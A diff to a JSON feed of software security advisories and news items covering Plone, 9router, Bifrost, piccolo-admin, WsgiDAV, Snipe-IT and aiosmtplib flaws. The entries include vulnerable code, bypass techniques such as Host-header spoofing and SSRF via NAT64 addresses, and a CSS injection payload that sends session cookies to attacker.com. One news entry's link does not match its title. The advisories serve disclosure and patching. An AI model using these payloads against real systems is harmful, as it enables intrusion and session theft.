+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55248",
+      "title": "plone.app.portlets vulnerable to denial of service via RSS feed portlet",
+      "summary": "### Impact\nBy adding an RSS portlet, and giving this a link to a very large file, a member can cause a denial of service attack, because Plone will use lots of memory. The member could also use different urls to try to get information about the internal network and open port numbers (SSRF). A malicious RSS feed could cause stored XSS, when the url of a feed item is a javascript url.\n\n### Patches\nThe problem has been patched in `plone.app.portlets`.\n\n* For Plone 6.2: upgrade to `plone.app.portlets` 7.0.2\n* For Plone 6.1: upgrade to `plone.app.portlets` 6.0.4\n* For Plone 6.0: upgrade to `plone.app.portlets` 5.0.8\n\n### Workarounds\nIf upgrading is not immediately possible:\n\n- Restrict who can manage portlets: remove the `plone.app.portlets.ManageOwnPortlets` permission from untrusted roles, and limit Manage portlets to trusted administrators (usually this is already restricted to the Manager and Site Administrator roles).\n- Where the RSS portlet is not needed, unregister it so it cannot be added. This would need to be done by editing a `portlets.xml` in your own code, so it is not a quick fix.\n\n### References\n\nThis is similar to this [`plone.app.event` vulnerability](https://github.com/plone/plone.app.event/security/advisories/GHSA-r82h-mqw3-fc56). It was discovered by the Plone Security Team by thinking of similar cases to the `plone.app.event` problem.",
+      "link": "https://github.com/advisories/GHSA-x5g3-w747-2h8q",
+      "published": "2026-08-28T18:41:35Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55248"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55641",
+      "title": "9router: Unauthenticated `/v1` proxy access via `Host`-header spoofing \u2192 open AI relay + SSRF",
+      "summary": "## Summary\n\n9router's request guard decides a request is \"local\" (and therefore exempt from API-key auth on the `/v1` LLM proxy) by reading the **client-controlled `Host` header**. Because 9router binds `0.0.0.0` by default (and the CLI misleadingly prints \"localhost\"), a remote, unauthenticated attacker who can reach the port can send `Host: localhost` to be treated as local and obtain `/v1` proxy access with **no API key, no CLI token, and no dashboard login**. In the default configuration (`requireApiKey` is absent from `DEFAULT_SETTINGS`, so the handler-side key check is skipped), this yields:\n\n- **Open AI relay** \u2014 the proxy forwards the attacker's requests to AI providers using the **victim's stored paid API keys** (cost/quota theft, prompt-based data exfiltration through the victim's accounts).\n- **Unauthenticated SSRF** \u2014 `/v1/search` with the built-in `noAuth` `searxng` provider takes its outbound fetch URL from the request body (`provider_options.baseUrl`), so the attacker drives a server-side fetch to any internal/cloud-metadata host and gets the JSON response reflected back.\n\n- **Affected:** `9router <= 0.4.80` (current), `src/dashboardGuard.js` (`isLocalRequest`), `src/sse/handlers/{chat,search}.js`, `src/lib/db/repos/settingsRepo.js`, `cli/cli.js`.\n- **Distinct from** the existing advisories GHSA-fhh6-4qxv-rpqj (MCP-plugin RCE, patched) and GHSA-xrrh-p7f2-27vm (legacy `<0.3.75` authz bypass).\n\n## Details\n\n### The bypass (`src/dashboardGuard.js`)\n```js\nfunction isLoopbackHostname(h){ const name=h.split(\":\")[0].replace(/^\\[|\\]$/g,\"\").toLowerCase();\n  return new Set([\"localhost\",\"127.0.0.1\",\"::1\"]).has(name); }\nfunction isLocalRequest(request){\n  if (!isLoopbackHostname(request.headers.get(\"host\"))) return false;   // <-- client-controlled Host\n  const origin = request.headers.get(\"origin\");\n  if (origin){ try { if (!isLoopbackHostname(new URL(origin).hostname)) return false; } catch { return false; } }\n  return true;\n}\nasync function canAccessPublicLlmAp",
+      "link": "https://github.com/advisories/GHSA-86m2-fcxq-5q7c",
+      "published": "2026-08-28T18:33:20Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55641"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55245",
+      "title": "Bifrost's SSRF deny-list is incomplete: isPublicIP permits CGNAT, IPv6 6to4/NAT64, and site-local in FetchAndEncodeURL",
+      "summary": "## Summary\n\n`isPublicIP` in `core/providers/utils/fetch.go` \u2014 the SSRF deny-list that gates `FetchAndEncodeURL` \u2014 does not reject several routable address ranges that map onto internal infrastructure. Carrier-Grade NAT (`100.64.0.0/10`, RFC 6598), IPv6 6to4 (`2002::/16`), NAT64 (`64:ff9b::/96` and `64:ff9b:1::/48`), and deprecated IPv6 site-local (`fec0::/10`) are all classified as public and permitted. An attacker who controls a multimodal image/document URL in a Bedrock or Vertex request body can drive the gateway to fetch internal services it should not reach \u2014 including the cloud instance-metadata endpoint via the 6to4 / NAT64 embeddings of `169.254.169.254`.\n\nThe rest of the fetch hardening is correct and is **not** part of this report: the dial-time `LookupIP` + pin to `ips[0]` closes the DNS-rebinding TOCTOU, `CheckRedirect` re-validates redirect targets, the scheme gate, the 25 MiB cap, and the 20 s timeout all work. This is purely a residual IP-classification gap in `isPublicIP`.\n\n## Affected component\n\n- File: `core/providers/utils/fetch.go`, function `isPublicIP` (lines 107-118), reached only through `FetchAndEncodeURL` (line 28).\n- Go module: `github.com/maximhq/bifrost/core`\n- Version: confirmed on the current `dev` HEAD `f415c144678bd4b411d74a1c1f85f18652833224` (`core/version` = `1.5.15`).\n\n## Vulnerable code\n\n```go\nfunc isPublicIP(ip net.IP) bool {\n\taddr, ok := netip.AddrFromSlice(ip)\n\tif !ok {\n\t\treturn false\n\t}\n\taddr = addr.Unmap()\n\tif addr.IsLoopback() || addr.IsPrivate() || addr.IsLinkLocalUnicast() || addr.IsLinkLocalMulticast() ||\n\t\taddr.IsMulticast() || addr.IsUnspecified() || addr.IsInterfaceLocalMulticast() {\n\t\treturn false\n\t}\n\treturn true\n}\n```\n\n`addr.IsPrivate()` covers only RFC 1918 + RFC 4193 (`fc00::/7`); it does **not** cover CGNAT `100.64.0.0/10`. `addr.Unmap()` only collapses the `::ffff:0:0/96` IPv4-mapped form, so 6to4 (`2002::/16`) and NAT64 (`64:ff9b::/96`, `64:ff9b:1::/48`) IPv6 representations of internal/link-local IPv4 are nev",
+      "link": "https://github.com/advisories/GHSA-w98g-5w9p-p3rc",
+      "published": "2026-08-28T18:26:02Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55245"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55485",
+      "title": "piccolo-admin has a privilege escalation issue - admin to superuser via session-token disclosure in GET /api/tables/sessions/.",
+      "summary": "## Summary\n\n`piccolo_admin` uses a helper called `superuser_validators` to gate access to the user and session tables for non-superusers. The helper rejects `PUT`, `PATCH`, `DELETE`, and `POST`, but **does not reject `GET`**.\n\nThe `sessions` table stores live session tokens **in plaintext**, and the token column is not marked `secret=True`, so it is included in every `GET` response. Any non-superuser admin can therefore list every other user's live session token with one request, replay the token as their own `Cookie: id=\u2026`, impersonate that user (including the superuser), and then permanently self-promote by writing `superuser = true` on their own row.\n\nThe chain is reachable on a realistic, documented configuration: a deployer adds the `Sessions` (and `User`) tables to `create_admin([...])` so superusers have a UI to monitor and revoke sessions.\n\n## Affected component\n\n- **File**: `piccolo_admin/endpoints.py`\n- **Function**: `superuser_validators` (around line 419)\n\n```python\ndef superuser_validators(piccolo_crud: PiccoloCRUD, request: Request):\n    user: BaseUser = request.user.user\n    if not user.superuser:\n        if request.method.upper() in [\"PUT\", \"PATCH\", \"DELETE\", \"POST\"]:\n            raise HTTPException(\n                detail=\"Only superusers can perform these actions.\",\n                status_code=405,\n            )\n```\n\nThe method check is a **deny-list** instead of an **allow-list**; `GET` is absent. Compounding the issue, `SessionsBase.token` in `piccolo_api/session_auth/tables.py` is a `Varchar` without `secret=True`, so the default `exclude_secrets=True` in `PiccoloCRUD` does not strip it.\n\n## Preconditions\n\n1. Network reachability to the admin.\n2. Valid credentials for a non-superuser admin (`admin=True, superuser=False` \u2014 the default role created by `BaseUser.create_user(admin=True)`).\n3. The deployment includes the `Sessions` table (and typically the `User` table) in `create_admin([...])` \u2014 the documented pattern for \"active sessions\" managemen",
+      "link": "https://github.com/advisories/GHSA-2gh4-jmwq-rr8w",
+      "published": "2026-08-28T18:14:13Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55485"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55509",
+      "title": "WsgiDAV MySQL provider has a blind SQL injection",
+      "summary": "### Summary\n\nThe sample `MySQLBrowserProvider` builds its SQL queries by concatenating strings, and the record key from the request URL goes straight into the WHERE clause with no escaping. Any user who can reach a share backed by this provider can inject SQL through the URL. Since these read shares are commonly published without authentication, an anonymous attacker can read arbitrary data from the backing database. Confirmed locally with a boolean oracle and full data extraction.\n\n**Note:**\nThe `MySQLBrowserProvider` module is only provided as an example for WsgiDAV and not enabled by default.\nInstallations that do not explicitly activate the module in their configuration are not affected by this vulnerability.\n\n### Details\n\nA path like `/db/users/1` is split into a table name and a key. The table name is validated against the real table list, but the key is dropped directly into the query. For the configured table the resulting statement is `SELECT id FROM testdb.users WHERE id = '<key>'`, so a single quote in the key breaks out of the literal and the rest runs as SQL.\n\nThe provider's numeric-type check has a typo (`INTT` instead of `INT`), so even integer primary keys take the quoted branch, but that branch is equally injectable, just with a quote breakout. The injectable key is read during the normal existence check on a plain GET, so no authentication, write access, or special method is needed.\n\nThe behavior shows up cleanly as a status-code oracle. A condition that matches rows returns one status, a condition that matches nothing returns 404, which is enough to extract data bit by bit. As a side note, the provider also crashes with a 500 on valid record reads because of an unrelated md5 bug, which is what makes the positive case here surface as 500 rather than 200. That crash is just broken behavior on its own and is not the finding.\n\n### PoC\n\nTested against MySQL 8 in Docker and WsgiDAV 4.3.4 from PyPI, share `/db` mapped to `MySQLBrowserProvider`, anonymous",
+      "link": "https://github.com/advisories/GHSA-p6gw-4frg-j7jw",
+      "published": "2026-08-28T18:12:17Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55509"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55516",
+      "title": "Snipe-IT vulnerable to cross-company asset maintenance re-parenting via API update",
+      "summary": "### Impact\nThe API endpoint for updating asset maintenance records allows an authorized user to change the asset_id of an existing maintenance record to an asset outside their company scope.\n\nIn a Full Multiple Company Support / multi-company deployment, this allows a user from Company A to attach or move a maintenance record onto an asset belonging to Company B. The endpoint appears to authorize access to the existing maintenance record\u2019s asset, but does not re-authorize the newly supplied asset_id before saving the update.\n\n###  Affected endpoint\n`PATCH /api/v1/maintenances/{maintenance_id}`\n\nAlso likely affected:\n\n`PUT /api/v1/maintenances/{maintenance_id}`\n\n### Preconditions\nThe attacker needs:\n- A valid authenticated API token.\n- Permission to update asset maintenance records.\n- Access to a maintenance record currently attached to an asset in their own company.\n\nThe attacker does not need access to the target asset\u2019s company.\n\n### Root cause\nIn the API maintenance update flow, the application checks access to the current maintenance record / current asset, then accepts attacker-controlled fields including `asset_id`.\n\nThe vulnerable behavior is that the new asset_id is not checked against the current user\u2019s company scope before being saved.\n\n### Relevant code path:\n`app/Http/Controllers/Api/MaintenancesController.php`\n\nThe update method loads the maintenance, checks access to the existing $maintenance->asset, then calls:\n```php\n$maintenance->fill($request->all());\n$maintenance->save();\n```\n\nSince `asset_id` is fillable on the maintenance model, the attacker can re-parent the record to another company\u2019s asset.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\n### Security impact\nThis breaks tenant/company isolation in multi-company deployments. A scoped user can write maintenance records against assets outside their authorized company boundary.\n\nPotential impact includes:\n- Cross-company asset history pollution",
+      "link": "https://github.com/advisories/GHSA-575r-357h-fhch",
+      "published": "2026-08-28T18:06:05Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55516"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55481",
+      "title": "Snipe-IT has CSS Injection via `header_color` Setting",
+      "summary": "### Impact\n\nBecause `default.blade.php` is the base layout loaded on every authenticated page, all active user sessions are affected immediately upon the next page load after the payload is saved. An attacker who has compromised an admin account (or who is a malicious insider) can use this to silently exfiltrate session tokens from all other users, including other administrators.\n\nAdditionally, the Content Security Policy is disabled by default in Snipe-IT installations, which removes the primary browser-level mitigation for this class of attack.\n\n\n### Details\nThe `header_color` setting (and related color settings such as `nav_color` and `link_color`) is rendered inside a CSS `<style>` block using Laravel's `{{ }}` syntax:\n\n```\n--main-theme-color: {{ $snipeSettings->header_color ?? '#3c8dbc' }};\n```\n\nAlthough `{{ }}` applies HTML entity encoding, this is insufficient in a CSS context. An attacker with superadmin access to the `Settings > Branding` page can inject arbitrary CSS by setting the `header_color` value to something like:\n\n```\n    #fff; } body { background: url('[https://attacker.com/exfil?c='+document.cookie](https://attacker.com/exfil?c=%27+document.cookie)); } .x {\n```\n\nThis breaks out of the CSS property value and injects a new rule that executes in the context of every authenticated user's browser on every page load.\n\n### Patches\nPatched in https://github.com/grokability/snipe-it/pull/19097\n\n### Workarounds\nEnable CSP in your .env file.",
+      "link": "https://github.com/advisories/GHSA-w7qw-5wfv-gwx9",
+      "published": "2026-08-28T18:04:29Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55481"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-55472",
+      "title": "Snipe-IT's API Location Creation Bypasses FMCS Parent-Child Company Boundary Validation",
+      "summary": "### Impact\nWhen Full Multiple Companies Support and scope_locations_fmcs are both enabled, the API endpoint for creating locations can still create a child location under a parent location from a different company. The code detects the invalid parent/child company mismatch, but it appears not to return immediately, so the request continues and the record is still saved. The equivalent Web flow correctly rejects the same relationship.\n\nThis breaks the expected company-boundary enforcement for location hierarchies under FMCS. It allows cross-company parent/child relationships to be inserted into the location tree, which can affect hierarchy integrity, downstream business logic, and the consistency of company isolation between the Web and API interfaces.\n\n### Patches\nPatched in https://github.com/grokability/snipe-it/commit/9a8cbd6e00613a726b639a97a1da71b3c54f9489",
+      "link": "https://github.com/advisories/GHSA-8w8c-8mx9-52cw",
+      "published": "2026-08-28T18:01:06Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-55472"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "CVE-2026-55565",
@@ -516,6 +912,23 @@
       "is_high_severity": true
     },
     {
+      "id": "https://thehackernews.com/2026/08/snowflake-github-actions-flaw-lets.html",
+      "title": "ownCloud Flaw Exploited to Steal Nuclear Records From Philippine Research Body",
+      "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Thursday added a critical security flaw impacting ownCloud to its Known Exploited Vulnerabilities (KEV) catalog following reports that a Chinese-speaking threat actor weaponized the vulnerability to target a nuclear research body in the Philippines.\n\nThe vulnerability, tracked as CVE-2023-49105 (CVSS score: 9.8), is a case of",
+      "link": "https://thehackernews.com/2026/08/snowflake-github-actions-flaw-lets.html",
+      "published": "2026-08-28T15:56:55+00:00",
+      "source": "The Hacker News Security",
+      "tags": [
+        "news",
+        "zeroday"
+      ],
+      "cve_ids": [
+        "CVE-2023-49105"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
       "id": "https://www.securityweek.com/openai-agents-exploited-linux-kernel-flaw-on-companys-own-systems/",
       "title": "OpenAI Agents Exploited Linux Kernel Flaw on Company\u2019s Own Systems",
       "summary": "CISA has added the exploited flaw, CVE-2026-53362, to its KEV catalog, alongside a JFrog vulnerability exploited by OpenAI agents. The post OpenAI Agents Exploited Linux Kernel Flaw on Company\u2019s Own Systems appeared first on SecurityWeek .",
@@ -563,24 +976,6 @@
       ],
       "cve_ids": [
         "CVE-2026-65643"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-55558",
-      "title": "aiosmtplib: STARTTLS response injection",
-      "summary": "## Impact\n\nWhen a connection is upgraded with STARTTLS, aiosmtplib reads the server's 220 go-ahead reply and immediately performs the TLS handshake without discarding any data still sitting in the receive buffer. Bytes the protocol read off the plaintext socket before the handshake survive across the plaintext\u2192TLS boundary (the asyncio transport is swapped in place, so the protocol object and its buffer are reused), and are then parsed as though they had arrived inside the TLS session.\n\nWho is affected: Any caller that uses STARTTLS by passing `start_tls=True` or `start_tls=None` when the server advertises STARTTLS, and whose traffic can be intercepted by an active network attacker on the plaintext leg of the connection.\n\nA man in the middle can send, in a single segment immediately after the client's STARTTLS command, the 220 reply followed by attacker-chosen response lines (e.g. 220 Go ahead\\r\\n250-mx.evil\\r\\n250 AUTH LOGIN\\r\\n). aiosmtplib\n  consumes only the 220, leaves the injected lines buffered, completes the handshake, and then parses the attacker's pre-staged plaintext as the first post-TLS server response. This also desynchronizes every\n  subsequent command/response pair inside the \"encrypted\" session.\n\nNot affected: Connections using implicit/direct TLS (`use_tls=True`) have no plaintext phase and are not vulnerable. The attack requires an active man in the middle via network compromise; a passive eavesdropper cannot exploit it.\n\n\n# Patches\n\n  A fix is available in aiosmtplib 5.1.2. All earlier versions that support STARTTLS are affected; upgrade to 5.1.2 or\n  later.\n\n  The fix treats any data buffered after the 220 STARTTLS reply and before the handshake as a protocol violation, per RFC 3207 \u00a74.2 (\"the client MUST discard any knowledge obtained from the server \u2026 which was not\n  obtained from the TLS negotiation itself\").\n\n# Workarounds\n\n  If you cannot upgrade immediately:\n\n  - Use implicit TLS instead of STARTTLS. Connect with `use_tls=True`. This remov",
-      "link": "https://github.com/advisories/GHSA-vxj7-4xrp-5vr4",
-      "published": "2026-08-27T23:32:22Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-55558"
       ],
       "is_zero_day": false,
       "is_high_severity": true
